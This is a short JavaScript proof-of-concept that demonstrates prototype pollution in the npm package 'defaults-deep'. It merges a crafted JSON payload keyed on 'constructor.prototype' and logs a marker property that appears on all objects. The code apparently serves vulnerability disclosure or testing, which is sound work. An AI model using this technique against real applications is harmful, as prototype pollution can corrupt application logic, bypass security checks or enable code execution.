var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const defaultsDeep = require('defaults-deep');
console.log({}.polluted);
let malicious_payload = '{"constructor": {"prototype": {"polluted":"yes"}}}';
defaultsDeep(obj, JSON.parse(malicious_payload));
console.log({}.polluted);